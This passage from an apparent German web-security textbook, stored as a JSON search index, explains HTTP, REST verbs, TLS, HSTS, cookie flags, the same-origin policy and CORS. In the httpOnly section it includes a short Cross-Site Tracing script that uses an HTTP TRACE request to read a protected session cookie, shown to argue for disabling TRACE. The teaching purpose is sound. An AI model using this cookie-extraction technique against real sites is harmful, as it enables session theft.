innerhalb des verschl\u00fcsselten Credential-File hinterlegt ist), mittels der Kommandozeilenoperation rails credentials:edit kann man die (kurzfristig) entschl\u00fcsselten Credentials editieren. Auf diese Weise wird sichergestellt, dass falls ein Angreifer ein Backup oder Source-Code Repository erbeutet, dieser trotzdem nicht auf die sensiblen Credentials Zugriff erh\u00e4lt.</p>"},{"location":"web-applications/web_applications/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was versteht man unter der Angriffsfl\u00e4che? Gib mehrere Beispiele f\u00fcr    Angriffsfl\u00e4chen die \u00fcber die reine Webapplikation hinausgehen.</p> </li> <li> <p>Erkl\u00e4re das Problem der Wartungszust\u00e4ndigkeit/Verantwortlichkeiten    wenn die Entwicklung und der Betrieb einer Webapplikation auf    mehrere Administratoren und Entwickler verteilt wird.</p> </li> <li> <p>Erl\u00e4utere den Unterschied zwischen impliziten und expliziten Routing    von Operationen am Applikationsserver.</p> </li> <li> <p>Wie k\u00f6nnen Konfigurationsdaten sicher innerhalb einer Applikation    bereitgestellt werden?</p> </li> </ol> <p>[2] Ein Beispiel aus dem Jahr 2020 w\u00e4ren 10 GeForce RTX 2080 Ti Grafikkarten, diese erreichen z.B. 551 Giga-Hashes/Sekunde (Quelle: https://www.onlinehashcrack.com/tools-benchmark-hashcat-gtx-1080-ti-1070-ti.php.</p>"},{"location":"web-applications/web_technologies/","title":"Web Technologien","text":"<p>Der Titel dieses Dokumentes ist Web Security, dementsprechend sind unsere Ziele/Patienten auch Webapplikationen. Eine Definition f\u00e4llt nicht einfach \u2014 allgemein betrachtet ist eine Webapplikation eine auf der Client-Server-Architektur basierte Applikation die als Kommunikationsprotokoll HTTP verwendet.</p> <p>Bei einer Client-Server Applikation versendet der Client einen Auftrag an einen Server; letzterer f\u00fchrt diesen im Namen des Clients aus und sendet die Antwort zur\u00fcck. Im Zusammenhang mit Webapplikationen gehen wir von einem Webbrowser als Client aus. Die meisten vorgestellten Probleme betreffen auch Web-API Clients, auf diese wird allerdings nicht explizit eingegangen.</p>"},{"location":"web-applications/web_technologies/#http","title":"HTTP","text":"<p>Das Hypertext Transfer Protocol (HTTP[1]) ist ein textbasiertes Protokoll welches prim\u00e4r zur Kommunikation zwischen Webservern und Web-Clients (wie z.B. Webbrowsern) verwendet wird. HTTP 1.0 wurde 1996 als RFC 1945 als expliziter Non-Standard ver\u00f6ffentlicht. 1999 wurde das Protokoll mit dem Update auf HTTP 1.1 (RFC 2616) modernisiert, es wurde z.B. HTTP Pipelining (die \u00dcbertragung mehrerer Dateien innerhalb einer HTTP Verbindung) in den Standard aufgenommen.</p> <p>2015 wurde HTTP/2 im RFC 7540/7541 definiert: Verbesserungen betreffen das Multiplexing von Anfragen, server-seitige Push-Nachrichten und die Kompression der \u00fcbertragenen Daten. Per Stand 2020 kann davon ausgegangen werden, dass Zwei-Drittel bis Drei-Viertel der Webkommunikation bereits \u00fcber HTTP/2 abgewickelt wird.</p> <p>HTTP verwendet zumeist TCP auf Port 80, die verschl\u00fcsselte Variante HTTPS verwendet Port 443. H\u00e4ufig verwendete Ports f\u00fcr weitere HTTP-basierte Services sind 3000, 8000, 8080 und 8081.</p> <p>Das Protokoll basiert auf Nachrichten, die zwischen Client (Browser) und Server \u00fcbertragen werden. Dabei folgt auf den initialen Request des Clients immer eine Response des Servers.</p> <p>Aktuell wird HTTP/3 basierend auf QUIC entwickelt. Diese Protokollversion wird vieles ver\u00e4ndern, so wird z.B. ein Umstieg von TCP auf UDP diskutiert, auch die Verwendung von Port 443 bleibt eventuell nicht mehr bestehen.</p>"},{"location":"web-applications/web_technologies/#http-request","title":"HTTP Request","text":"<p>Bei HTTP 1.0/1.1 werden Anfragen von Webbrowsern an Webserver als mehrzeilige Textdokumente verschickt. Die erste Zeile dieses Dokuments beinhaltet als erstes Wort das zu verwendete HTTP Verb gefolgt von dem aufgerufenen Pfad und der verwendeten HTTP-Version. Jede weitere Zeile beinhaltet einen HTTP Header, diese sind immer als Key: Value strukturiert.</p> <p>Bei folgendem Beispiel versucht ein Webbrowser auf die Datei <code>/index.html</code> eines Webservers lesend (Verb: <code>GET</code>) zuzugreifen:</p> <pre><code>GET /index.html HTTP/1.1\nHost: snikt.net\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n</code></pre>"},{"location":"web-applications/web_technologies/#http-request-verbsmethoden","title":"HTTP Request Verbs/Methoden","text":"<p>Ein Request beginnt immer mit einem HTTP Verb (auf Englisch auch HTTP Request Method genannt), dieses beschreibt die Aktion die der Client gerne h\u00e4tte. H\u00e4ufig verwendete Verben werden in folgender Tabelle gelistet:</p> Verb safe idempotent Name GET ja ja Beschreibt einen Lesezugriff bei dem es zu keiner Ver\u00e4nderung des serverseitigen States kommen sollte. HEAD ja ja Entspricht einem HTTP GET, allerdings wird kein HTTP Body \u00fcbertragen. Diese Operation wird h\u00e4ufig verwendet um Meta-Daten zu erfragen. POST Ist eine datenver\u00e4ndernde Operation und wird verwendet um ein neues Objekt zum Server zu \u00fcbertragen (also um quasi ein neues Objekt anzulegen). PUT ja Ist eine datenver\u00e4ndernde Operation welche ein Objekt am Server ersetzt, also quasi aktualisiert. DELETE ja L\u00f6scht ein Objekt/Datei vom Server. PATCH Ist eine datenver\u00e4ndernde Operation welche einen Teil eines bestehenden Objektes modifiziert. CONNECT Wird verwendet um einen Tunnel aufzubauen. OPTIONS ja ja Listet alle erlaubten Kommunikationsoptionen f\u00fcr eine Resource auf. TRACE F\u00fchrt zu Debug-Zwecken einen loop-back Test aus. <p>Ein verwendetes HTTP Verb kann sowohl safe als auch idempotent sein. Safe Verben sollten niemals Resourcen ver\u00e4ndern (also Daten am Server modifizieren).</p> <p>Idempotente Verben sollten auch bei wiederholtem Aufruf auf eine Resource das idente Ergebnis liefern. Sie k\u00f6nnen also beliebig h\u00e4ufig aufgerufen, und wiederholt werden. Wenn z.B. w\u00e4hrend eines DELETE Aufrufs ein Timeout geschieht, kann der Client die Operation wiederholen ohne einen undefinierten server-seitigen State zu erzeugen. Aus diesem Grund wird z.B. ein Update eines bestehenden Datensatzes gerne \u00fcber das PUT Verb implementiert: wird ein Update mit den gleichen \u00fcbergebenen Daten ausgef\u00fchrt, kann es beliebig h\u00e4ufig wiederholt werden und der server-seitige State sollte ident sein.</p> <p>Die Verwendung des richtigen Verbs besitzt rein semantische Natur und muss von der Web-Applikation umgesetzt werden. Nichts hindert einen Programmierer, eine Operation mit einem unpassenden HTTP Verb anzubieten. Allerdings gehen mehrere Komponenten (wie z.B. Web Proxies, Caches oder Web Application Firewalls) von der richtigen Verwendung der jeweiligen Verben aus, wird ein falsches Verb verwendet kann dadurch inkorrektes Verhalten provoziert werden.</p>"},{"location":"web-applications/web_technologies/#representational-state-transfer-rest","title":"Representational State Transfer (REST)","text":"<p>Das REST-Paradigma wurde von Roy Fielding 2000 im Zuge seiner Dissertation ver\u00f6ffentlicht. Das Paradigma versucht es, zustandlose APIs \u00fcber eine einheitliche Schnittstelle anzubieten. Jede gespeicherte Ressource sollte eine eindeutige URL besitzen, als Kommunikationssprache wird h\u00e4ufig HTTP eingesetzt.</p> <p>Folgende Tabelle zeigt wie h\u00e4ufig ben\u00f6tige CRUD-Funktionalit\u00e4t[2] auf HTTP Verben umgelegt wird:</p> Verb Operation Beispiel Beschreibung GET READ <code>/notes/1</code> Fordert die Ressource vom Server an. Diese Operation sollte safe und idempotent sein. POST CREATE <code>/notes</code> Erstellt eine neue Ressource am Server, deren URI wird zur\u00fcck gegeben. PUT CREATE/UPDATE <code>/notes/2</code> Erstellt oder ersetzt eine Ressource an der angegeben URI. PATCH UPDATE <code>/notes/2</code> Die angegebene Ressource wird ver\u00e4ndert, Nebeneffekte sind erlaubt. DELETE DELETE <code>/notes/2</code> Die angegebene Ressource wird gel\u00f6scht. HEAD READ <code>/notes/2</code> Liefert Meta-Daten f\u00fcr die angegebene Ressource."},{"location":"web-applications/web_technologies/#request-host-header","title":"Request Host Header","text":"<p>Der \u00fcbergebene Host-Header kann sicherheitsrelevant sein: dieser Header wird nicht verwendet um auf der Netzwerkebene das Ziel zu identifizieren, sondern wird erst vom Zielwebserver verwendet. Einige Webserver verwenden diesen Header um Adressen innerhalb der Antwortseite zu generieren.</p>"},{"location":"web-applications/web_technologies/#http-response","title":"HTTP Response","text":"<p>Der Server liefert nun ein Antwortdokument:</p> <pre><code>HTTP/1.1 302 Found\nDate: Sun, 03 Mar 2019 22:03:21 GMT\nServer: Apache/2.4.25 (Debian)\nLocation: https://snikt.net/\nContent-Length: 277\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;302 Found&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Found&lt;/h1&gt;\n&lt;p&gt;The document has moved &lt;a href=\"https://snikt.net/\"&gt;here&lt;/a&gt;.&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.25 (Debian) Server at snikt.net Port 80&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>Hier f\u00e4llt zuerst der Statuscode (302) auf. Prinzipiell beschreiben Codes aus dem 100er Bereich Continue, Codes im 200er Bereich Erfolg (success), Code im 300er Bereich sind Redirects, Codes im 400er Bereich sind clientseitige Fehler und Codes im 500er Bereich beschreiben serverseitige Fehler.</p> <p>Webserver k\u00f6nnen mehrere optionale HTTP Header inkludieren und auf diese Weise dem Webbrowser Informationen mitteilen. Diese M\u00f6glichkeit wird h\u00e4ufig im Zuge des Browser-Hardenings verwendet: hierbei teilt der Webserver Securityannahmen dem Client mit. Dieser kann dadurch effizient gegen client-seitige Angriffe innerhalb des erhaltenen Contents vorgehen.</p>"},{"location":"web-applications/web_technologies/#information-disclosure-durch-http-header","title":"Information Disclosure durch HTTP Header","text":"<p>Die optionalen Header k\u00f6nnen einen negativen Sicherheitsimpact besitzen, h\u00e4ufig kommt es z.B. zu einer Information Disclosure. Bei dieser erh\u00e4lt der Angreifer durch gespr\u00e4chige Server Informationen, die ein normaler Benutzer eigentlich nicht ben\u00f6tigen sollte aber einem Angreifer behilflich sind. Im gezeigten Antwortdokument teil der Server den verwendeten Webserver (Apache), das verwendete Betriebssystem (Debian) und die Versionsnummer des Webservers (2.4.25) \u00fcber den Server Header mit. Dies erlaubt es einem Angreifer, gezielt nach Schwachstellen f\u00fcr diese Softwarekomponente zu suchen. Im Zuge des Hardenings werden solche Versionsinformationen zumeist maskiert.</p>"},{"location":"web-applications/web_technologies/#transportlevel-sicherheit","title":"Transportlevel-Sicherheit","text":"<p>Eine Webapplikation sollte immer und ausschlie\u00dflich \u00fcber das gesicherte HTTPS-Protokoll kommunizieren. Um die Sicherheit des Transports zu gew\u00e4hrleisten sollte TLS[3] eingesetzt werden, die Abk\u00fcrzung TLS steht dementsprechend auch f\u00fcr Transport Level Security.</p>"},{"location":"web-applications/web_technologies/#tls","title":"TLS","text":"<p>Beim Einsatz von TLS sollte eine aktuelle Version (aktuell TLSv1.2) verwendet werden, innerhalb von TLS sollten sichere Algorithmen (AES-256-GCM oder ChaCha20-Poly1305) bereitgestellt werden. Aktuell wird TLSv1.2 von ca. 95-96% der Webserver angeboten. Jeder HTTP/2 kompatible Client muss ebenso TLSv1.2 unterst\u00fctzen.</p> <p>Wenn m\u00f6glich sollten \u00e4ltere TLS-Versionen vermieden werden, da durch diese schlechtere Kryptographie in Kauf genommen werden muss. So schreibt der TLS-Standard vor Version 1.2 vor, dass der Cipher 3DES-CBC zwingend in einer Standard-konformen Implementierung angeboten werden muss. Dieser Cipher ist zwar noch sicher, wird aber teilweise schon als legacy klassifiziert \u2014 sollte also bei neuen Implementierungen nicht mehr verwendet werden. Mit TLSv1.2 wird nicht mehr 3DES-CBC sondern AES-128-CBC als notwendiger Cipher vorgeschrieben. Mit TLSv1.3 wurde der CBC-Modus entfernt: dies ist aus Sicherheitssicht stark begr\u00fc\u00dfenswert, allerdings ist diese Version des Standards noch nicht ver\u00f6ffentlicht.</p>"},{"location":"web-applications/web_technologies/#welche-kanale-mussen-beachtet-werden","title":"Welche Kan\u00e4le m\u00fcssen beachtet werden?","text":"<p>Die Entwickler und Administratoren m\u00fcssen darauf achten, dass alle Kommunikationswege auf die gleiche Art und Weise gesch\u00fctzt werden. Es muss vermieden werden, dass z.B. ein Webserver mit einer sicheren TLS-Konfiguration konfiguriert wurde, aber die identen Operationen mittels eines Webservices ungesichert \u00fcber HTTP bereitgestellt werden.</p> <p>Ein h\u00e4ufiger Diskussionspunkt ist, welche Verbindungen durch TLS abgesichert und verschl\u00fcsselt werden m\u00fcssen. Prinzipiell sollte jegliche \u00dcbertragung \u00fcber \u00f6ffentliche Kan\u00e4le gesichert erfolgen. Der Einsatz von Verschl\u00fcsselung innerhalb des Rechenzentrums, z.B. zwischen Applikationsserver und Datenbanken, wird allerdings teilweise diskutiert. Die Verwendung der Verschl\u00fcsselung bewirkt geringere Performance, h\u00f6here Kosten und verhindert teilweise die Verwendung anderer Sicherheitstechniken (z.B. von Network-based IDSen) \u2014 daher wird teilweise ein Rechenzentrum als a-priori sicher angenommen und innerhalb dessen keine Verschl\u00fcsselung erzwungen. Die jeweilige Entscheidung muss dokumentiert und durch das Management unterzeichnet werden.</p>"},{"location":"web-applications/web_technologies/#perfect-forward-secrecy","title":"Perfect Forward Secrecy","text":"<p>Perfect Forward Secrecy (PFS) ist eine optionale Eigenschaft von Key-Exchange Protokollen und kann z.B. bei TLS zum Einsatz kommen. TLS verwendet einen Langzeitschl\u00fcssel \u2014 w\u00e4hrend des Verbindungsaufbau wird basierend auf diesem ein Sitzungsschl\u00fcssel ausgemacht. Zeichnet ein Angreifer die verschl\u00fcsselte Kommunikation auf und erh\u00e4lt auf irgendeine Weise den Langzeitschl\u00fcssel, kann er die Verschl\u00fcsselung aufbrechen. Dies ist problematisch, da der Langzeitschl\u00fcssel auch Jahre nach der eigentlich erfolgten Kommunikation verloren gehen k\u00f6nnte.</p> <p>Bei Verwendung von PFS kann mit dem Langzeitschl\u00fcssel der Sitzungsschl\u00fcssel nicht mehr rekonstruiert werden. Dadurch wird die Gefahr einer sp\u00e4teren Offenlegung der Kommunikation durch Verlust des Langzeitschl\u00fcssels gebannt.</p>"},{"location":"web-applications/web_technologies/#hsts","title":"HSTS","text":"<p>Der HTTP Strict Transport Security (HSTS, RFC 6797) Header teilt dem Webbrowser mit, dass Folgezugriffe auf die Webseite immer \u00fcber ein sicheres Protokoll zu erfolgen haben. Bei Angabe des Headers wird eine Laufzeit in Sekunden[4] f\u00fcr diese Regel angegeben:</p> <pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n</code></pre> <p>Sobald dieser Header vom Browser interpretiert wird, werden potentielle zuk\u00fcnftige HTTP-Aufrufe automatisch vom Browser auf HTTPS hochgestuft. Zus\u00e4tzlich sch\u00fctzen Webbrowser (bei Verwendung von HSTS) Benutzer vor un\u00fcberlegten Entscheidungen und erlauben nicht mehr das Akzeptieren von defekten oder invaliden Zertifikaten.</p> <p>HSTS kann durch zwei Optionen erweitert werden. Durch includeSubDomains inkludiert Subdomains in den HSTS Schutz. Dies ist wichtig, da ein Angreifer von einer Subdomain auf die Cookies der Hauptdomain zugreifen kann und dadurch auf HSTS-gesch\u00fctzte Cookies zugreifen k\u00f6nnte.</p> <p>Durch das Setzen von preload wird der Wunsch der Webseite mitgeteilt in Google Chrome\u2019s HTTPS preload Liste aufgenommen zu werden[5]. Dies ist eine Liste von Webseiten, die ausschlie\u00dflich \u00fcber HTTPS verf\u00fcgbar sind. Wird dieser Header gesetzt, ist die Seite effektiv \u00fcber Chrome nie wieder \u00fcber HTTP erreichbar.</p>"},{"location":"web-applications/web_technologies/#verbindungssicherheit-bei-websockets","title":"Verbindungssicherheit bei WebSockets","text":"<p>Eine WebSocket-URL beinhaltet das zu verwendende Protokoll, dieses kann entweder ws (WebSocket) oder wss (WebSocket Secure) sein. Aus Sicherheitssicht sollte ausschlie\u00dflich wss verwendet werden.</p>"},{"location":"web-applications/web_technologies/#sessions-and-cookies","title":"Sessions and Cookies","text":"<p>Eine Session ist eine stehende Verbindung zwischen einem Client und einem Server. Innerhalb der Session kann der Server Zugriffe einem Client zuordnen. Eine Session wird h\u00e4ufig verwendet um nach erfolgten Login am Server die darauffolgenden Operationen dem eingeloggten Benutzer zuordnen zu k\u00f6nnen.</p> <p>HTTP ist ein zustandsloses Protokoll: jeder Zugriff ist alleinstehend. Die Session muss daher auf einer h\u00f6heren Ebene implementiert werden. Im Web-Umfeld werden zumeist Cookie-basierte Sessions verwendet, andere M\u00f6glichkeiten w\u00e4ren z.B. Token-basierte Systeme.</p> <p>Ein Cookie ist ein kleines Datenpaket welches im Zuge des Session-Managements vom Server dem Client mitgeteilt wird. Der Client speichert nun dieses Cookie und inkludiert es in jedem Folgeaufruf zu dem setzenden Webserver. Ein Cookie besteht aus einem Namen, Wert, Ablaufdatum und einem G\u00fcltigkeitsbereich (Domain und/oder Pfad).</p> <p>Wird eine Domain f\u00fcr ein Cookie gesetzt, wird das Cookie f\u00fcr diese Domain und alle Subdomains \u00fcbertragen. Dies ist \u00fcberraschend unsicherer als keine Domain zu setzen: in diesem Fall w\u00fcrde das Cookie nur an die idente Domain (nicht an die Subdomains) \u00fcbertagen werden.</p> <p>Eine wichtige Cookie-Option ist das Setzen eines G\u00fcltigkeitspfades. Wird dieser gesetzt, dann wird das Cookie nur f\u00fcr Ressourcen \u00fcbertragen, deren Pfad \u201cunter\u201d diesem Pfad liegen. Auf diese Wiese k\u00f6nnen mehrere Applikationen auf unterschiedlichen Pfaden auf einem Webserver betrieben werden w\u00e4hrend keine Applikation auf die Cookies einer anderen Applikation zugreifen kann.</p> <p>Zus\u00e4tzlich zu den Cookie-Einstellungen gibt es spezielle sicherheitsrelevante Cookie-Flags:</p>"},{"location":"web-applications/web_technologies/#secure-flag","title":"secure-Flag","text":"<p>Durch das secure-Flag wird die \u00dcbertragung des Cookies mittels HTTPS erzwungen. Bei potentiell auftretenden HTTP-Zugriffen wird kein Cookie \u00fcbermittelt, der Request allerdings abgesendet. Dies erlaubt es dem Webserver auf sichere Weise ein HTTP 300 Redirect von HTTP auf HTTPS durchf\u00fchren.</p>"},{"location":"web-applications/web_technologies/#httponly-flag","title":"httpOnly-Flag","text":"<p>Das httpOnly-Flag verbietet es Webbrowsern den Zugriff mittels Javascript auf das Cookie. Falls das Cookie nur zur Bildung der Benutzersession verwendet wird, kann dieses Flag durch den Webserver gesetzt, und damit Javascript-basierte Identity Theft Angriffe stark erschwert werden. Achtung: dieses Flag besitzt keinen Einfluss auf die Verwendung des HTTP- oder HTTPS-Protokolls.</p> <p>Problematisch ist in diesem Zusammenhang die HTTP TRACE Methode. Diese dient zu Analysezwecken und kopiert den eingehenden Request als Content in das Antwortdokument. Falls der Angreifer nicht mittels Javascript auf das Session-Cookie zugreifen kann, aber die M\u00f6glichkeit besitzt per Javascript einen HTTP TRACE Aufruf auf den Opfer-Webserver abzusetzen, kann er auf diese Weise das Session-Cookie extrahieren:</p> <pre><code>&lt;script&gt;\n  var xmlhttp = new XMLHttpRequest();\n  var url = 'http://127.0.0.1/';\n\n  xmlhttp.withCredentials = true; // send cookie header\n  xmlhttp.open('TRACE', url, false);\n  xmlhttp.send();\n&lt;/script&gt;\n</code></pre> <p>Aus diesem Grund wird empfohlen, auf Webservern immer HTTP TRACE zu deaktivieren.</p>"},{"location":"web-applications/web_technologies/#samesite-flag","title":"sameSite-Flag","text":"<p>Das sameSite-Flag dient zur Vermeidung von CSRF-Angriffen[6]. Das Flag unterrichtet den Browser, unter welchen Umst\u00e4nden ein Session-Cookie an eine Webseite \u00fcbertragen werden soll.</p> <p>Bei Verwendung von strict wird niemals ein Session-Cookie im cross-domain Kontext \u00fcbertragen. Dies bedeutet, dass das Cookie nur \u00fcbertragen wird, wenn der Benutzer von der Webseite auf einen Link/eine Operation auf der identen Webseite navigiert. Wird z.B. ein Link auf die Webseite von einer externen Quelle angeklickt (z.B. innerhalb eines Forums oder ein Link innerhalb einer Email), wird bei dem URL-Aufruf kein Cookie \u00fcbergeben. Hier muss beachtet werden, dass falls die Webseite eine Unvalidated Forward or Redirect-L\u00fccke besitzt, der Angreifer diese ansteuern kann und bei dem durchgef\u00fchrten zweiten Aufruf der Browser das Cookie inkludiert und dadurch potentiell b\u00f6sartige Aktionen ausgef\u00fchrt werden k\u00f6nnen.</p> <p>Bei Verwendung von lax darf der Browser bei dem cross-site Zugriff auf die Webseite das Cookie \u00fcbertragen, dies aber nur wenn eine sichere HTTP Methode (nicht daten-ver\u00e4ndernd) verwendet wird und das Ziel eine top-level navigation ist (sprich die Webseite aufgerufen wird und nicht eine Operation innerhalb der Webseite).</p> <p>Google wollte mit Chrome 80[7] seinen Umgang mit dem SameSite-Flag versch\u00e4rfen: als default w\u00fcrde SameSite=Lax als Default verwendet werden, der Wert SameSite=None w\u00fcrde vom Webbrowser ignoriert werden. Aufgrund der Corona/Covid-19 Situation wurden diese \u00c4nderungen verschoben.</p>"},{"location":"web-applications/web_technologies/#beispiel-fur-cookies","title":"Beispiel f\u00fcr Cookies","text":"<p>Ein einfaches Cookie-Beispiel bei dem das Cookie sessionid gesetzt wird. Der Zugriff mittels JavaScript wurde durch httpOnly verboten, das Cookie ist f\u00fcr alle Pfade g\u00fcltig. Da kein Ablaufdatum (Expires) bzw. Lebenszeit (Max-Age) angegeben wurde, wird das Cookie beim Schlie\u00dfen des Browsers gel\u00f6scht:</p> <pre><code>Set-Cookie: sessionid=38afes7a8; HttpOnly; Path=/\n</code></pre> <p>Das folgende Cookies mit Namen id wird vor der unsicheren \u00dcbertragung mittels HTTP (Secure) als auch vor Zugriffen mittels JavaScript (httpOnly) gesch\u00fctzt. Die Lebensdauer wurde mit einem absoluten Datum angegeben:</p> <pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n</code></pre> <p>Ein Beispiel f\u00fcr das Setzen der sicherheitsrelevanten Header:</p> <pre><code>Set-Cookie: CookieName=CookieValue; SameSite=Strict; httpOnly; Secure;\n</code></pre>"},{"location":"web-applications/web_technologies/#javascript","title":"JavaScript","text":"<p>Wird \u00fcber Webprogrammierung gesprochen f\u00e4llt fr\u00fcher oder sp\u00e4ter der Name der Programmiersprache JavaScript (auch teilweise mit JS abgek\u00fcrzt). Im Jahr 1995 war das Web noch statisch[8], der vorherrschende Webbrowser war Netscape Navigator, Microsoft Internet Explorer war gerade in einer ersten Version erschienen. Um dynamische client-seitige Webseiten zu erm\u00f6glichen beauftrage Netscape Brendon Eich damit eine neue Programmiersprache f\u00fcr die Exekution innerhalb des Webbrowsers zu entwicklern. Diese wurde initial LiveScript getauft, aus Marketing-Gr\u00fcnden \u2014 Java war damals der aktuelle Hype \u2014 wurde diese Sprache in JavaScript umbenannt.</p> <p>Im Laufe der Zeit entwicklete[9] Microsoft f\u00fcr den Internet Explorer einen Klon: JScript. Leider waren die Netscape- und Microsoft-Versionen teilweise inkompatibel zueinander. Netscape versuchte diesen Wildwuchs durch eine Standardisierung der Sprache durch ECMA namens ECMAScript entgegen zu wirken, da mittlerweile Microsoft Internet Explorer marktbeherrschend war, und das damalige Microsoft noch weniger offener, wurde dieser Standard nie von der breiten Masse angenommen.</p> <p>Dies \u00e4nderte sich 2008: seit 2005 wurde AJAX vermehrt verwendet und basierte auf JavaScript, ebenso gab es mittlerweile drei gro\u00dfe JavaScript-Familien: Mozilla/Firefox, Microsoft/Internet Explorer und Google/Chrome. Die Hersteller entschlossen sich, JavaScript zu standardisieren und gemeinsam an ECMAScript zu arbeiten. Ende 2009 wurde als Ergebnis ECMAScript5 ver\u00f6ffentlicht. Mit ECMAScript6 entstand 2015 die ,,moderne\u201d JavaScript Sprache, seitdem entscheiden j\u00e4hrlich neue ECMAScript-Versionen.</p> <p>W\u00e4hrend JavaScript-Engines urspr\u00fcnglich nur im Browser eingesetzt wurden, \u00e4nderte sich dies 2010 mit dem Erscheinen von node.js. Diese Umgebung verwendete zwar die Google V8 JavaScript-Engine, wurde aber als ein Server gestartet. Durch diese Entwicklung konnte in JavaScript auch server-seitig entwickelt werden. Da ,,die Branche\u201d immer einen Mangel an Programmierern hat und viele ,,Entwickler\u201d JavaScript ,,konnten\u201d wurde diese M\u00f6glichkeit gerne genutzt.</p> <p>Auch au\u00dferhalb von Browsern wurden Einsatzgebiete f\u00fcr JavaScript entdeckt. PhoneGap (mittlerweile Apache Cordova) erlaubte das Entwickeln von mobilen Anwendungen mittels HTML, JavaScript und CSS seit 2009, seit 2010 k\u00f6nnen mittels Electron traditionelle Desktop-Applikationen in JavaScript entwickelt werden.</p>"},{"location":"web-applications/web_technologies/#die-sprache-javascript","title":"Die Sprache JavaScript","text":"<p>JavaScript selbst ist eine Multi-Paradigma Programmiersprache und war initial prim\u00e4r f\u00fcr imperative und funktionale Programmierstile ausgelegt. Mit sp\u00e4teren ECMAScript-Versionen wurden die Objekt-orientierten Ans\u00e4tze ausgebaut, es blieb allerdings bei einer Prototyp-basierten Vererbung. Auch das Typsystem ist noch immer dynamisch, optionales static-typing wird durch Projekte wie TypeScript oder flow bereitgestellt. Source Code kann in mehrere Module strukturiert werden, auch dies ist mittlerweile Teil des ECMAScript Standards.</p> <p>Betreffend der Nebenl\u00e4ufigkeit wurde ein Event-basierter Ansatz gew\u00e4hlt. Dies f\u00fchrte zu Problemen bei langlaufenden Prozessen/Requests, daher hat sich innerhalb von JavaScript-Programmen die Verwendung von Callback-Funktionen etabliert. In ECMAScript6 wurden ,,elegantere\u201d Konzepte wie Promises und Futures eingef\u00fchrt, mit ECMAScript7 dieser Einsatz durch Schl\u00fcsselw\u00f6rter wie async/await vereinfacht.</p> <p>Aktuell kann davon ausgegangen werden, dass JavaScript nicht so schnell von der Bildfl\u00e4che verschwinden wird. F\u00fcr weiterf\u00fchrende Informationen zu der Programmiersprache, bzw. zu deren moderneren Versionen, wird die Lekt\u00fcre von The Modern JavaScript Tutorial[10] bzw. von You don\u2019t know JS[11] empfohlen.</p>"},{"location":"web-applications/web_technologies/#same-origin-policy-sop","title":"Same-Origin-Policy (SOP)","text":"<p>Die Same-Origin-Policy ist fixer Bestandteil moderner Browser. Origin ist definiert als die Kombination von Schema, Domainname und Port[12] (z.B. https://snikt.net:443). Die Same-Origin-Policy moderner Browser sagt aus, dass ein Skript das von Seite 1 geladen wurde, nur auf Ressourcen auf Seite 2 zugreifen darf, wenn beide Seiten den identen Origin besitzen.</p> <p>Die Same-Origin-Policy ist essentiell f\u00fcr die Sicherheit. W\u00fcrde es diese nicht geben, k\u00f6nnte Javascript ausgehend von einer Seite auf die Daten (DOM) einer externen Seite zugreifen. Da dieser Zugriff durch den Webbrowser geschieht, w\u00fcrde bei diesem Zugriff das Session-Cookie mit \u00fcbertragen werden und die Operation w\u00fcrde mit der Identit\u00e4t des Webbrowser-Benutzers durchgef\u00fchrt werden.</p>"},{"location":"web-applications/web_technologies/#cross-origin-resource-sharing-cors","title":"Cross-Origin Resource Sharing (CORS)","text":"<p>W\u00e4hrend die Same-Origin-Policy aus Sicherheitssicht begr\u00fc\u00dfenswert ist, muss sie teilweise aufgeweicht werden. Zum Beispiel k\u00f6nnte eine Webseite aus Sicherheitsgr\u00fcnden auf mehrere Teilserver aufgeteilt worden sein: <code>www.evil.com</code> beinhaltet die klassische Webseite, w\u00e4hrend <code>api.evil.com</code> Operationen anbietet, die von <code>www</code> aus aufgerufen werden sollten.</p> <p>Um diese Zugriffe sauber zu erlauben, wird Cross-Domain Resource Sharing verwendet. Hierbei werden zus\u00e4tzliche Browser-Header verwendet, \u00fcber diese wird dem Webbrowser signalisiert, auf welche Operationen zugegriffen werden darf.</p> <p>Da diese Information \u00fcber HTTP Header mitgeteilt wird, muss vor der eigentlichen Operation eine Kommunikation zwischen dem Webbrowser und dem API Server geschehen (wenn der Header erst als Antwort auf die ausgef\u00fchrte Operation \u00fcbertragen worden w\u00e4re, w\u00e4re es etwas sp\u00e4t\u2026). Daf\u00fcr wird die so genannten preflight authorization verwendet.</p> <p>Operationen, bei denen Webbrowser CORS durchf\u00fchren sollten:</p> <ul> <li> <p>alle HTTP Methoden ausser HTTP GET und HTTP POST</p> </li> <li> <p>HTTP POST, abh\u00e4ngig vom verwendeten Content-Type</p> </li> <li> <p>AJAX-Requests</p> </li> <li> <p>Web Fonts</p> </li> </ul> <p>Ist eine CORS-Authorization notwendig, werden folgende Schritte durchgef\u00fchrt:</p> <ol> <li> <p>Der Webbrowser eines Benutzers erkennt, dass er ausgehend von www    auf api zugreifen will und hierf\u00fcr ein CORS Authorization    notwendig ist.</p> </li> <li> <p>Um diese durchzuf\u00fchren, versendet er einen HTTP OPTIONS request auf    die gew\u00fcnschte Operation auf api und setzt dabei den Origin    Header: <code>Origin: http://www</code> auf die aufrufende Webseite.</p> </li> <li> <p>Der api Webserver antwortet nun mit dem HTTP Header    <code>Access-Control-Allow-Origin: http://www</code> und signalisiert dem    Webbrowser dass der Zugriff auf api ausgehend von www erlaubt    ist.</p> </li> <li> <p>Der Webserver f\u00fchrt nun die Operation auf api durch.</p> </li> </ol>"},{"location":"web-applications/web_technologies/#jsonp","title":"JSONP","text":"<p>Vor der Verf\u00fcgbarkeit von CORS wurde 